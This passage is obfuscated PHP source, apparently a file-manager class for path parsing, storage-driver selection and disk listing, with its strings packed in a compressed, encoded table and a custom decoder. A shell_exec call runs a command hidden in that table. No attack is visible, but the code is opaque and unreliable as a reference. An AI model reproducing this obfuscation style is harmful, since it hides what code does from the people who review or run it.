$‚éäôõ­ = str_replace($óäôíŒÚ[264], $óäôíŒÚ[8], str_replace($óäôíŒÚ[1463], $óäôíŒÚ[8], $‚éäôõ­)); $‚éäôõ­ = str_replace($óäôíŒÚ[264], $óäôíŒÚ[8], str_replace($óäôíŒÚ[1463], $óäôíŒÚ[8], $‚éäôõ­)); if (!strstr($‚éäôõ­, $óäôíŒÚ[1461])) { return $‚éäôõ­; } $ÍãªéÃŠ = explode($óäôíŒÚ[8], $‚éäôõ­); foreach ($ÍãªéÃŠ as $ıØäÙ­¤ => $ÊË¤§µ) { if ($ÊË¤§µ !== $óäôíŒÚ[1464]) { continue; } for ($Şö¥…êÂ = $ıØäÙ­¤; $Şö¥…êÂ >= 0; $Şö¥…êÂ--) { if ($ÍãªéÃŠ[$Şö¥…êÂ] === $óäôíŒÚ[10] || $ÍãªéÃŠ[$Şö¥…êÂ] === $óäôíŒÚ[1464] || $ÍãªéÃŠ[$Şö¥…êÂ] === -1) { continue; } if ($ÍãªéÃŠ[$Şö¥…êÂ] === $óäôíŒÚ[12]) { $ÍãªéÃŠ[$ıØäÙ­¤] = -1; break; } $ÍãªéÃŠ[$ıØäÙ­¤] = -1; $ÍãªéÃŠ[$Şö¥…êÂ] = -1; break; } } $¸åÄô«Ó = array(); foreach ($ÍãªéÃŠ as $ÊË¤§µ) { if ($ÊË¤§µ !== -1) { $¸åÄô«Ó[] = $ÊË¤§µ; } } $°åÁ¸ = implode($óäôíŒÚ[8], $¸åÄô«Ó); if (strpos($°åÁ¸, $óäôíŒÚ[1465]) === 0) { $°åÁ¸ = $óäôíŒÚ[1461] . substr($°åÁ¸, strlen($óäôíŒÚ[1465])); } return $°åÁ¸; } public static function pathUrlClear($ ŠĞáß) { $ùÜ±ß¾Ï =& $_SERVER[øşô´çË]; if (!$ ŠĞáß) { return $ ŠĞáß; } $ ŠĞáß = rawurldecode($ ŠĞáß); $ ŠĞáß = str_replace($ùÜ±ß¾Ï[1463], $ùÜ±ß¾Ï[8], $ ŠĞáß); if (strpos($ ŠĞáß, $ùÜ±ß¾Ï[86]) > 0) { $ ŠĞáß = substr($ ŠĞáß, 0, strpos($ ŠĞáß, $ùÜ±ß¾Ï[86])); } if (strpos($ ŠĞáß, $ùÜ±ß¾Ï[1466]) > 0) { $ ŠĞáß = substr($ ŠĞáß, 0, strpos($ ŠĞáß, $ùÜ±ß¾Ï[1466])); } return $ ŠĞáß; } public static function sourceID($¤ß•ÆÊ½) { $Œä°µÉ =& $_SERVER[øşô´çË]; $—üµöõã = self::parse($¤ß•ÆÊ½); if ($—üµöõã[$Œä°µÉ[43]] !== self::KOD_SOURCE) { show_json(LNG($Œä°µÉ[1467]), !1); } return $—üµöõã[$Œä°µÉ[496]]; } public static function make($ÊİÅõŒä) { if (!$ÊİÅõŒä) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÊİÅõŒä)); } public static function makeShare($ Öªê“, $½·Ù •ª) { return self::makePath(self::KOD_SHARE_ITEM, $ Öªê“, $½·Ù •ª); } public static function makeFileTypePath($×ä€´øÖ) { return self::makePath(self::KOD_USER_FILE_TYPE, $×ä€´øÖ); } public static function makeFileTagPath($¼”ŸµØ´) { return self::makePath(self::KOD_USER_FILE_TAG, $¼”ŸµØ´); } public static function makePath($öÓ‘Ò, $éÒ¨˜Äœ = '', $¯­¸ç = '') { $¾ëÂ›Ú­ =& $_SERVER[øşô´çË]; $ ”™‹œ› = substr($öÓ‘Ò, 1, -1); $è¹üäÓª = $¾ëÂ›Ú­[1468] . $ ”™‹œ› . $¾ëÂ›Ú­[1469] . $éÒ¨˜Äœ . $¾ëÂ›Ú­[1470]; $è¹üäÓª = $¯­¸ç ? $è¹üäÓª . $¯­¸ç . $¾ëÂ›Ú­[8] : $è¹üäÓª; return $è¹üäÓª; } public static function hashPath($ó¦Ê±–, $İ•¹¿Á = false) { $Ãù‘ËÉ =& $_SERVER[øşô´çË]; if (!$ó¦Ê±–) { return $Ãù‘ËÉ[12]; } $îµÂ©Ş = is_array($ó¦Ê±–) ? $ó¦Ê±– : IO::info($ó¦Ê±–); $›ÓÅêÑ´ = _get($îµÂ©Ş, $Ãù‘ËÉ[1471], $Ãù‘ËÉ[12]); if (!$›ÓÅêÑ´ && isset($îµÂ©Ş[$Ãù‘ËÉ[566]])) { $›ÓÅêÑ´ = $îµÂ©Ş[$Ãù‘ËÉ[566]]; } if (!$›ÓÅêÑ´ && isset($îµÂ©Ş[$Ãù‘ËÉ[245]])) { $›ÓÅêÑ´ = trim($îµÂ©Ş[$Ãù‘ËÉ[245]], $Ãù‘ËÉ[128]); } if ($›ÓÅêÑ´) { return $›ÓÅêÑ´; } if (!$›ÓÅêÑ´ && isset($îµÂ©Ş[$Ãù‘ËÉ[201]]) && $îµÂ©Ş[$Ãù‘ËÉ[201]]) { $îµÂ©Ş = IO::info(KodIO::make($îµÂ©Ş[$Ãù‘ËÉ[201]])); $›ÓÅêÑ´ = _get($îµÂ©Ş, $Ãù‘ËÉ[1471], $Ãù‘ËÉ[12]); if (!$›ÓÅêÑ´ && isset($îµÂ©Ş[$Ãù‘ËÉ[566]])) { $›ÓÅêÑ´ = $îµÂ©Ş[$Ãù‘ËÉ[566]]; } } $Úõó°¾Ã = md5($îµÂ©Ş[$Ãù‘ËÉ[97]] . $îµÂ©Ş[$Ãù‘ËÉ[89]] . $îµÂ©Ş[$Ãù‘ËÉ[98]]); $æûù›úõ = $Úõó°¾Ã . $Ãù‘ËÉ[1472]; $›ÓÅêÑ´ = $›ÓÅêÑ´ ? $›ÓÅêÑ´ : Cache::get($æûù›úõ); if (!$›ÓÅêÑ´ && $İ•¹¿Á) { $›ÓÅêÑ´ = IO::hashSimple($îµÂ©Ş[$Ãù‘ËÉ[97]]); Cache::set($æûù›úõ, $›ÓÅêÑ´ ? $›ÓÅêÑ´ : $Úõó°¾Ã, 3600 * 24 * 30); } return $›ÓÅêÑ´ ? $›ÓÅêÑ´ : $Úõó°¾Ã; } public static function hashPathSafe($É›Íœ, $‹êİìŠ¶ = false) { $£¹ùıÇ =& $_SERVER[øşô´çË]; $ï‘†™§… = self::hashPath($É›Íœ, $‹êİìŠ¶); return md5($ï‘†™§… . $£¹ùıÇ[1473] . Model($£¹ùıÇ[875])->get($£¹ùıÇ[876])); } public static function initSystemPath() { $”êÚÔ—¿ =& $_SERVER[øşô´çË]; if (defined($”êÚÔ—¿[1474])) { return; } define($”êÚÔ—¿[1474], self::systemPath($”êÚÔ—¿[199])); define($”êÚÔ—¿[1475], self::systemPath($”êÚÔ—¿[1476])); define($”êÚÔ—¿[1477], self::systemPath($”êÚÔ—¿[1478])); define($”êÚÔ—¿[1479], self::systemPath($”êÚÔ—¿[1480])); IOHistory::bindEvent(); } public static function systemPath($²ÑÈæëœ) { $¸ä–ßÍ  =& $_SERVER[øşô´çË]; $¾ŞÉÃÉ÷ = $¸ä–ßÍ [1481] . ucfirst($²ÑÈæëœ); $Ôì…¿—™ = Model($¸ä–ßÍ [875])->get($¾ŞÉÃÉ÷); if ($Ôì…¿—™) { return $Ôì…¿—™; } if ($²ÑÈæëœ == $¸ä–ßÍ [199]) { $Ôì…¿—™ = self::make(Model($¸ä–ßÍ [935])->systemRootPathAdd($¸ä–ßÍ [637])); } else { $Ôì…¿—™ = self::systemPath($¸ä–ßÍ [199]); $¿ƒª’†Ã = self::sourceID($Ôì…¿—™); $Ôì…¿—™ = self::make(Model($¸ä–ßÍ [935])->mkdir($¿ƒª’†Ã, $²ÑÈæëœ)); } Model($¸ä–ßÍ [875])->set($¾ŞÉÃÉ÷, $Ôì…¿—™); return $Ôì…¿—™; } public static function systemFolder($À‚ì’»•) { $©´ÜÂíå = IO_PATH_SYSTEM_SOURCE . $À‚ì’»•; $„¥„ìŒ« = Cache::get($©´ÜÂíå); if (!$„¥„ìŒ«) { $Šşæ¤Á† = IO::infoFullSimple($©´ÜÂíå); if (!$Šşæ¤Á†) { $„¥„ìŒ« = IO::mkdir($©´ÜÂíå, REPEAT_SKIP); } else { $„¥„ìŒ« = $Šşæ¤Á†[$_SERVER[øşô´çË][97]]; } Cache::set($©´ÜÂíå, $„¥„ìŒ«, 3600 * 10); } return $„¥„ìŒ«; } public static function defaultDriver() { return Model($_SERVER[øşô´çË][870])->defaultDriver(); } public static function defaultDriverInit() { $Á…ö…Ü– =& $_SERVER[øşô´çË]; static $±½ÃŸ‘ = false; if ($±½ÃŸ‘) { return $±½ÃŸ‘; } $³ŸÆ»÷ = self::defaultDriver(); $±½ÃŸ‘ = IO::init($Á…ö…Ü–[1482] . $³ŸÆ»÷[$Á…ö…Ü–[496]] . $Á…ö…Ü–[1470]); return $±½ÃŸ‘; } public static function fileTypeList() { $ğä™âï =& $_SERVER[øşô´çË]; $™›ß’ = $GLOBALS[$ğä™âï[6]][$ğä™âï[1483]]; foreach ($™›ß’ as $¦ÆÚ¤ƒ™ => $ŞÁ¢ò”) { $©‰‹­Ä = $ğä™âï[1484] . $¦ÆÚ¤ƒ™; $úòÄçù = LNG($©‰‹­Ä); if ($©‰‹­Ä != $úòÄçù) { $™›ß’[$¦ÆÚ¤ƒ™][$ğä™âï[42]] = $úòÄçù; } } return $™›ß’; } public static function ioFileDriverGet($ƒ´Œøô = '') { $½Ÿ¶åÁş =& $_SERVER[øşô´çË]; static $›ääíßô = array(); static $ä“¢ñ¬ = array(); static $ßš©”É = array(); static $™™ŒŒï¸ = false; if ($™™ŒŒï¸ === !1) { $™™ŒŒï¸ = array($½Ÿ¶åÁş[607] => array(), $½Ÿ¶åÁş[693] => array()); $ø¬Ş¨¥ = Model($½Ÿ¶åÁş[1485])->get(!1, $½Ÿ¶åÁş[1486]); foreach ($ø¬Ş¨¥ as $§¡‰µ¤˜ => $ñ¥şË°­) { if (!$ñ¥şË°­ || $ñ¥şË°­ == $½Ÿ¶åÁş[12]) { continue; } if (strstr($§¡‰µ¤˜, $½Ÿ¶åÁş[1487])) { $ßîàÄÒ = str_replace($½Ÿ¶åÁş[1487], $½Ÿ¶åÁş[12], $§¡‰µ¤˜); $™™ŒŒï¸[$½Ÿ¶åÁş[607]][$ßîàÄÒ] = $ñ¥şË°­; } else { if (strstr($§¡‰µ¤˜, $½Ÿ¶åÁş[1488])) { $ßîàÄÒ = str_replace($½Ÿ¶åÁş[1488], $½Ÿ¶åÁş[12], $§¡‰µ¤˜); $™™ŒŒï¸[$½Ÿ¶åÁş[693]][$ßîàÄÒ] = $ñ¥şË°­; } } } } $èŞïè¶å = self::defaultDriver(); if (!$ƒ´Œøô || !$™™ŒŒï¸[$½Ÿ¶åÁş[607]] && !$™™ŒŒï¸[$½Ÿ¶åÁş[693]]) { return $èŞïè¶å; } $ù¶‰’„¸ = self::getPathSourceID($ƒ´Œøô); if (!$ù¶‰’„¸) { return $èŞïè¶å; } if (isset($›ääíßô[$ù¶‰’„¸])) { return $›ääíßô[$ù¶‰’„¸]; } $æıæ°¾Ş = Model($½Ÿ¶åÁş[935])->sourceInfo($ù¶‰’„¸); $…ª¹Åˆš = $æıæ°¾Ş[$½Ÿ¶åÁş[598]]; $ë£üçú§ = array(); if (!$æıæ°¾Ş) { return $èŞïè¶å; } if ($æıæ°¾Ş[$½Ÿ¶åÁş[198]] == $½Ÿ¶åÁş[101]) { if (isset($ßš©”É[$…ª¹Åˆš])) { return $ßš©”É[$…ª¹Åˆš]; } if (isset($™™ŒŒï¸[$½Ÿ¶åÁş[693]][$…ª¹Åˆš])) { $¡³Õé = Model($½Ÿ¶åÁş[870])->driverInfo($™™ŒŒï¸[$½Ÿ¶åÁş[693]][$…ª¹Åˆš]); $èŞïè¶å = $¡³Õé ? $¡³Õé : $èŞïè¶å; $ßš©”É[$…ª¹Åˆš] = $èŞïè¶å; $›ääíßô[$ù¶‰’„¸] = $èŞïè¶å; return $èŞïè¶å; } $ë£üçú§ = self::groupParentUser($…ª¹Åˆš); } else { if ($æıæ°¾Ş[$½Ÿ¶åÁş[198]] == $½Ÿ¶åÁş[533]) { $£Ñ¦†ğÕ = Model($½Ÿ¶åÁş[1489])->getInfo($…ª¹Åˆš); if ($£Ñ¦†ğÕ) { $ë£üçú§ = explode($½Ÿ¶åÁş[60], trim($£Ñ¦†ğÕ[$½Ÿ¶åÁş[613]], $½Ÿ¶åÁş[60])); $ë£üçú§ = array_remove_value($ë£üçú§, $½Ÿ¶åÁş[238]); $ë£üçú§[] = $…ª¹Åˆš; $ë£üçú§ = array_reverse($ë£üçú§); } } } foreach ($ë£üçú§ as $¾‰¬ äğ) { if (!isset($™™ŒŒï¸[$½Ÿ¶åÁş[607]][$¾‰¬ äğ])) { continue; } if (isset($ä“¢ñ¬[$¾‰¬ äğ])) { return $ä“¢ñ¬[$¾‰¬ äğ]; } $¡³Õé = Model($½Ÿ¶åÁş[870])->driverInfo($™™ŒŒï¸[$½Ÿ¶åÁş[607]][$¾‰¬ äğ]); $èŞïè¶å = $¡³Õé ? $¡³Õé : $èŞïè¶å; $ä“¢ñ¬[$¾‰¬ äğ] = $èŞïè¶å; break; } if ($æıæ°¾Ş[$½Ÿ¶åÁş[198]] == $½Ÿ¶åÁş[101]) { $ßš©”É[$…ª¹Åˆš] = $èŞïè¶å; } $›ääíßô[$ù¶‰’„¸] = $èŞïè¶å; return $èŞïè¶å; } private static function getPathSourceID($•½°ı´Ç) { $‘Ÿ¹Ò =& $_SERVER[øşô´çË]; static $“©ÖÉº³ = array(); if (!$•½°ı´Ç) { return $‘Ÿ¹Ò[12]; } $ÔÙ¡£•· = substr($•½°ı´Ç, 0, strlen($‘Ÿ¹Ò[507])) == $‘Ÿ¹Ò[507]; $æÕ³õµğ = substr($•½°ı´Ç, 0, strlen($‘Ÿ¹Ò[1456])) == $‘Ÿ¹Ò[1456]; $Ô…éä¥“ = substr($•½°ı´Ç, 0, strlen($‘Ÿ¹Ò[1457])) == $‘Ÿ¹Ò[1457]; if (!$ÔÙ¡£•· && !$æÕ³õµğ && !$Ô…éä¥“) { return $‘Ÿ¹Ò[12]; } $«ƒğè¯° = self::parse($•½°ı´Ç); $ÏÒßÔÛæ = $«ƒğè¯°[$‘Ÿ¹Ò[1353]]; if ($ÔÙ¡£•·) { return $«ƒğè¯°[$‘Ÿ¹Ò[496]]; } if (isset($“©ÖÉº³[$ÏÒßÔÛæ])) { $µ·Ş¢¦ = $“©ÖÉº³[$ÏÒßÔÛæ]; } else { $µ·Ş¢¦ = IO::init($ÏÒßÔÛæ); $“©ÖÉº³[$ÏÒßÔÛæ] = $µ·Ş¢¦; } if (isset($µ·Ş¢¦->pathParse[$‘Ÿ¹Ò[1356]])) { return $µ·Ş¢¦->pathParse[$‘Ÿ¹Ò[1356]]; } return $‘Ÿ¹Ò[12]; } private static function groupParentUser($ÎŒÕ¾Ö) { $ÒÊŒåÍÅ =& $_SERVER[øşô´çË]; $—¾›àå = Model($ÒÊŒåÍÅ[626])->getInfo($ÎŒÕ¾Ö); if (!$—¾›àå) { return array(); } $›–ı×¸¾ = array_to_keyvalue($—¾›àå[$ÒÊŒåÍÅ[1490]], $ÒÊŒåÍÅ[12], $ÒÊŒåÍÅ[1491]); $»Èœ‘ å = array(); foreach ($—¾›àå[$ÒÊŒåÍÅ[1490]] as $¢ˆ¶Š‡Ñ) { $»Èœ‘ å[] = $¢ˆ¶Š‡Ñ[$ÒÊŒåÍÅ[1491]]; $Šæì€Ÿ¹ = explode($ÒÊŒåÍÅ[60], trim($¢ˆ¶Š‡Ñ[$ÒÊŒåÍÅ[613]], $ÒÊŒåÍÅ[60])); $Šæì€Ÿ¹ = array_remove_value($Šæì€Ÿ¹, $ÒÊŒåÍÅ[238]); $Šæì€Ÿ¹ = array_reverse($Šæì€Ÿ¹); $»Èœ‘ å = array_merge($»Èœ‘ å, $Šæì€Ÿ¹); } return array_unique($»Èœ‘ å); } public static function diskList($˜ô§Ïö³ = true) { $ÌÇŒşş = $_SERVER[øşô´çË][1492]; if ($˜ô§Ïö³) { $÷•ï¥ = Cache::get($ÌÇŒşş); if (is_array($÷•ï¥)) { return $÷•ï¥; } } $÷•ï¥ = self::diskListGet(); Cache::set($ÌÇŒşş, $÷•ï¥, 60); return $÷•ï¥; } public static function diskListGet() { $°ïüâÁá =& $_SERVER[øşô´çË]; $¤çÔè = array(); if ($GLOBALS[$°ïüâÁá[6]][$°ïüâÁá[1493]] == $°ïüâÁá[1494]) { $¢ÛôÓø = $°ïüâÁá[1495]; for ($¬áªÙòù = 0; $¬áªÙòù < strlen($¢ÛôÓø); $¬áªÙòù++) { $£şÕÂãÛ = $¢ÛôÓø[$¬áªÙòù] . $°ïüâÁá[1496]; if (file_exists($£şÕÂãÛ)) { $¤çÔè[] = $£şÕÂãÛ; } } return $¤çÔè; } if (!function_exists($°ïüâÁá[108])) { $¤çÔè[] = $°ïüâÁá[994]; return $¤çÔè; } $ùùòÁ›è = explode($°ïüâÁá[19], shell_exec($°ïüâÁá[1497])); array_shift($ùùòÁ›è); array_pop($ùùòÁ›è); $ÅÚÍó¤ = array($°ïüâÁá[1498], $°ïüâÁá[1499], $°ïüâÁá[1500], $°ïüâÁá[1501], $°ïüâÁá[1502], $°ïüâÁá[1503], $°ïüâÁá[1504], $°ïüâÁá[1505]); foreach ($ùùòÁ›è as $éÑÒŠñ) { $¯¬Š¯Ã = preg_split($°ïüâÁá[1506], $éÑÒŠñ); $£şÕÂãÛ = $¯¬Š¯Ã[count($¯¬Š¯Ã) - 1]; if (!strstr($¯¬Š¯Ã[0], $°ïüâÁá[1507]) || !$£şÕÂãÛ) { continue; } $Ø™ä½‘ = rtrim($£şÕÂãÛ, $°ïüâÁá[8]) . $°ïüâÁá[8]; $¤çÔè[] = $Ø™ä½‘; } return $¤çÔè; } public static function isSameDisk($ğ¶èÒà, $®Îá‡™©) { $ñÊ›Ïëâ =& $_SERVER[øşô´çË]; if ($GLOBALS[$ñÊ›Ïëâ[6]][$ñÊ›Ïëâ[1493]] == $ñÊ›Ïëâ[1494]) { return strtolower(substr($ğ¶èÒà, 0, 1)) == strtolower(substr($®Îá‡™©, 0, 1)); } $ıŒ•æ± = stat($ğ¶èÒà); $¤Ú¤÷Ø = stat($®Îá‡™©); if ($ıŒ•æ± === !1 || $¤Ú¤÷Ø === !1) { return !1; } return $ıŒ•æ±[$ñÊ›Ïëâ[1508]] === $¤Ú¤÷Ø[$ñÊ›Ïëâ[1508]]; $¹×Ã˜©‹ = self::diskList(); $æ‹Ü£Á = !1; $”‡°ñ½° = !1; sort($¹×Ã˜©‹); $¹×Ã˜©‹ = array_reverse($¹×Ã˜©‹); $ğ¶èÒà = rtrim($ğ¶èÒà, $ñÊ›Ïëâ[8]) . $ñÊ›Ïëâ[8]; $®Îá‡™© = rtrim($®Îá‡™©, $ñÊ›Ïëâ[8]) . $ñÊ›Ïëâ[8]; foreach ($¹×Ã˜©‹ as $Œœ·îø™) { $†£ÒÖÖ• = strlen($Œœ·îø™); if (!$æ‹Ü£Á && substr($ğ¶èÒà, 0, $†£ÒÖÖ•) == $Œœ·îø™) { $æ‹Ü£Á = $Œœ·îø™; } if (!$”‡°ñ½° && substr($®Îá‡™©, 0, $†£ÒÖÖ•) == $Œœ·îø™) { $”‡°ñ½° = $Œœ·îø™; } if ($æ‹Ü£Á && $”‡°ñ½°) { break; } } return $æ‹Ü£Á === $”‡°ñ½°; } public static function transferType($¶º‘¾©, $¡µşÖï‚) { $Ã×‚Ğüâ =& $_SERVER[øşô´çË]; $‰ìÙ¢Ì = self::driverType($¶º‘¾©); $¹êí†Ù¥ = self::driverType($¡µşÖï‚); if ($‰ìÙ¢Ì[$Ã×‚Ğüâ[43]] == $¹êí†Ù¥[$Ã×‚Ğüâ[43]] && $‰ìÙ¢Ì[$Ã×‚Ğüâ[1509]] == $¹êí†Ù¥[$Ã×‚Ğüâ[1509]]) { return $Ã×‚Ğüâ[1510]; } if ($‰ìÙ¢Ì[$Ã×‚Ğüâ[43]] == $Ã×‚Ğüâ[1028] && $¹êí†Ù¥[$Ã×‚Ğüâ[43]] == $Ã×‚Ğüâ[116]) { return $Ã×‚Ğüâ[1381]; } if ($‰ìÙ¢Ì[$Ã×‚Ğüâ[43]] == $Ã×‚Ğüâ[116] && $¹êí†Ù¥[$Ã×‚Ğüâ[43]] == $Ã×‚Ğüâ[1028]) { return $Ã×‚Ğüâ[117]; } return $Ã×‚Ğüâ[1511]; } public static function driverType($îì®ß€´) { $‰Öõúˆ™ =& $_SERVER[øşô´çË]; $œì—×²Š = str_replace($‰Öõúˆ™[1512], $‰Öõúˆ™[12], strtolower($îì®ß€´->getType())); if ($œì—×²Š == $‰Öõúˆ™[860] || $œì—×²Š == $‰Öõúˆ™[1513] || $œì—×²Š == $‰Öõúˆ™[1514]) { $°¨º½Ñ¶ = self::ioFileDriverGet($‰Öõúˆ™[507] . $îì®ß€´->pathParse[$‰Öõúˆ™[1356]] . $‰Öõúˆ™[411]); $îì®ß€´ = IO::init($‰Öõúˆ™[1482] . $°¨º½Ñ¶[$‰Öõúˆ™[496]] . $‰Öõúˆ™[1470]); } else { if ($œì—×²Š == $‰Öõúˆ™[1390] || $œì—×²Š == $‰Öõúˆ™[1515]) { $îì®ß€´ = IO::init($îì®ß€´->pathParse[$‰Öõúˆ™[1333]]); } } $œÛåõí¢ = $îì®ß€´->path; $œì—×²Š = str_replace($‰Öõúˆ™[1512], $‰Öõúˆ™[12], strtolower($îì®ß€´->getType())); if ($œì—×²Š == $‰Öõúˆ™[116]) { return array($‰Öõúˆ™[43] => $‰Öõúˆ™[116], $‰Öõúˆ™[1509] => $‰Öõúˆ™[12], $‰Öõúˆ™[97] => $œÛåõí¢, $‰Öõúˆ™[106] => $îì®ß€´); } return array($‰Öõúˆ™[43] => $‰Öõúˆ™[1028], $‰Öõúˆ™[1509] => $îì®ß€´->pathDriver, $‰Öõúˆ™[97] => $œÛåõí¢, $‰Öõúˆ™[106] => $îì®ß€´); } public static function pathDriverType($¯ñùšØ°) { return $¯ñùšØ° ? self::driverType(IO::init($¯ñùšØ°)) : !1; } public static function pathDriverLocal($‚–¦ÒĞ) { $ÀÖÀ’Ëƒ =& $_SERVER[øşô´çË]; $É†Ø€ÏÅ = $‚–¦ÒĞ ? self::driverType(IO::init($‚–¦ÒĞ)) : !1; return strtolower($É†Ø€ÏÅ[$ÀÖÀ’Ëƒ[43]]) == $ÀÖÀ’Ëƒ[116] ? !0 : !1; } public static function allowCover($û¤¬áÏØ, $¶ß‰‹Ìû = true) { $£É®ÀÙÌ =& $_SERVER[øşô´çË]; if (is_string($û¤¬áÏØ)) { $û¤¬áÏØ = IO::info($û¤¬áÏØ); } if (!$û¤¬áÏØ || $û¤¬áÏØ[$£É®ÀÙÌ[43]] == $£É®ÀÙÌ[88] || $û¤¬áÏØ[$£É®ÀÙÌ[89]] <= 100) { return !1; } if (isset($û¤¬áÏØ[$£É®ÀÙÌ[1516]]) || !$û¤¬áÏØ[$£É®ÀÙÌ[97]]) { return !1; } if (isset($û¤¬áÏØ[$£É®ÀÙÌ[242]]) && !$û¤¬áÏØ[$£É®ÀÙÌ[242]]) { return !1; } static $ÜÑ»ó” = false; if (!$ÜÑ»ó” || !$¶ß‰‹Ìû) { $›ŞÌš¢÷ = self::driverType(IO::init($û¤¬áÏØ[$£É®ÀÙÌ[97]])); $¯—Ú¸Ãì = $›ŞÌš¢÷[$£É®ÀÙÌ[106]]; $ÜÑ»ó” = $£É®ÀÙÌ[204]; if ($›ŞÌš¢÷[$£É®ÀÙÌ[43]] == $£É®ÀÙÌ[116]) { $ÜÑ»ó” = $£É®ÀÙÌ[1517]; } if ($›ŞÌš¢÷[$£É®ÀÙÌ[106]] && is_array($›ŞÌš¢÷[$£É®ÀÙÌ[106]]->config)) { $ûÚ€ëı¦ = $›ŞÌš¢÷[$£É®ÀÙÌ[106]]->config; if (isset($ûÚ€ëı¦[$£É®ÀÙÌ[1518]]) && $ûÚ€ëı¦[$£É®ÀÙÌ[1518]]) { $ÜÑ»ó” = $£É®ÀÙÌ[1517]; } } $±üï¥ğ² = KodIO::defaultDriver(); if (strtolower($±üï¥ğ²[$£É®ÀÙÌ[106]]) == $£É®ÀÙÌ[116] && is_array($±üï¥ğ²[$£É®ÀÙÌ[6]])) { $¯Ò£° = $±üï¥ğ²[$£É®ÀÙÌ[6]][$£É®ÀÙÌ[1365]]; if (substr($¯Ò£°, 0, 2) == $£É®ÀÙÌ[1519]) { $¯Ò£° = str_replace($£É®ÀÙÌ[1519], BASIC_PATH, $¯Ò£°); } $¯Ò£° = str_replace($£É®ÀÙÌ[264], $£É®ÀÙÌ[8], $¯Ò£°); if (substr($û¤¬áÏØ[$£É®ÀÙÌ[97]], 0, strlen($¯Ò£°)) == $¯Ò£°) { $ÜÑ»ó” = $£É®ÀÙÌ[204]; } } } return $ÜÑ»ó” == $£É®ÀÙÌ[1517] ? !0 : !1; } } goto bæ’ Â¼¶ò; eêì‹Œà: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xf8\xfe\xf4\xb4\xe7\xcb", "\365\374\201\357\271\231"); $_SERVER[øşô´çË] = explode("\174\3\174\3\174\2", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x79\x7c\x1b\xd5\xb5\x30\x4b\x5b\x9a\x40\xcb\xbe\x14\x5a\x98\x98\x4\xdb\x89\x16\xdb\x89\xb3\xd8\x71\x82\x2c\xcb\xb6\x88\x2c\x19\x49\xce\x82\x6d\x26\x63\x69\x6c\x4d\x2c\x69\x64"."\xcd\xc8\x4b\xe2\x14\x8\x84\x2d\x40\xa0\xec\x6d\x28\x94\xbd\xd0\x4\x4a\xcb\x1a\xb6\x16\xe8\x2\x2d\xb4\xd0\xd2\xf6\x41\xcb\x16\x67\x79\xa5\xd0\xc2\xeb\x2\x14\xfa\xdd\xe5\xdc\x65\x46\x32\xbc\xef\xf7\xfd\xf1\x5\x12\xdd\x7d".strrev('²‹Îg55ÅËr9üÜ_-¤øhçïòa¦ÿÖø¿óøÿ¢“yáúÿ³û]¹Î{œç¹îrî')."\xf5\x87\xdb\xb5\x2f\xb4\x5e\xf3\xaf\xa7\x7f\xf8\x8b\x6d\xbf\x79\xfd\x17\x77\x25\xd3\xcb\x1e\xd9\x36\x74\xe2\x7e\x1f\xbe\xff\xa3\x8f\x9b\x50\x51\x5a\xb3\x89\xfe\x28\x79\xd3\x56\xf4\x71\xc3\xb2\x2d\x9a\x90\x32\xf3\x83\xc6\x10"."\xd\x1b\x79\xfa\xeb\xa7\x3f\x3d\xf1\x48\x51\xcf\x99\xb6\x4e\xa3\x3e\xfa\xa3\x4a\xbd\x3a\x40\xd5\x6\x8d\x2c\xe4\xe3\x90\x65\xac\xd7\xe5\x9c\x4\x8a\x87\xf3\x22\x5f\x1d\xd2\x6d\x15\x7d\xd2\xd6\xf3\xac\x3\xad\x81\x44\x38\xa8"."\166\7\222\235\64\256\25\12\176\53\75\154\371\265\142\52\143\214\352\21\143\300\77\140\344\375\151\315\326\174\3\254\213\63\351\317\2\30\104\106\117\15\253\332\200\131\264\365\64\115\52\345\263\106\176\230"."\206\255\221\254\301\106\241\106\143\111\65\321\323\335\35\212\47\141\50\115\162\176\316\114\103\250\240\25\265\34\164\262\240\27\55\64\147\162\163\152\301\54\350\171\107\212\110\300\235\35\320\54\150\251\255\125".base64_decode('bQt1R2Jr1OSa7hCUGFBHSnpxgsZIMGFrRTtp5HReYqzI+9Ua6ghHlWQ8EE0EgslwLEqTg7GurnA=')."\262\74\75\36\213\104\132\3\301\25\345\71\335\361\100\107\127\100\101\375\103\313\141\344\7\315\32\145\55\315\131\253\324\322\100\273\241\147\141\32\363\32\353\216\75\121\200\120\222\207\20\60\345\113\331\54"."\215\104\171\50\255\17\152\245\54\314\126\233\34\51\24\215\234\306\6\275\102\237\340\251\260\366\45\333\64\362\51\32\11\215\333\105\115\244\243\276\246\20\70\42\300\241\151\211\120\44\24\114\52\270\203\112"."\x7b\x3c\xd6\xa5\xc0\x22\xe4\x34\xcb\xd6\x8b\xca\xaa\xce\x50\x3c\xa4\xe0\x4e\xb7\x54\x93\xb1\x56\x2b\x0\xd5\x51\x34\x15\x4a\x20\x12\x51\xa6\x6b\xc1\xd6\x73\x5\xd6\xc\xad\x53\xa1\xb1\x58\xbc\x2d\x14\x57\x5a\xd7\x28\x62\x86"."\122\146\56\147\346\175\250\25\264\222\266\324\325\120\74\116\3\36\330\204\221\60\136\64\210\304\332\333\23\41\36\203\301\235\36\101\75\231\17\360\351\210\245\7\263\266\72\252\145\113\14\114\1\310\253\341"."\x7\x7e\x4d\xb\x40\x77\xc4\xc8\x1b\x25\x0\x53\x68\xc2\x34\xf9\xe6\x87\x40\x89\x95\xd6\x59\x8a\x9e\x86\x40\xe\xd5\x37\xa1\xde\x0\xa4\xd\xb0\x52\xeb\x58\xc0\x40\x9b\x7a\x94\x6\x5b\x96\xd1\xdf\x66\xa8\x3f\x80\x37\xfc\xa8".base64_decode('XrRVPZ8y00YesM1ygEfNzrQV0UYv0vigmU2zsEAnGHlESzm5CI8iNJFNF/X8Z5ek0QjfybisiBU=').strrev('¤lÃ‰Ëd¬PÔvÌ3Cä^„éjk!Of!684m·Y!êZaÖ„)Š–e®yºåÄVÄ\'0&OP')."\245\111\350\203\46\63\172\66\253\352\343\72\154\211\134\272\321\142\143\361\133\30\53\242\24\32\15\307\324\214\146\145\272\322\215\52\251\5\137\314\247\365\161\137\4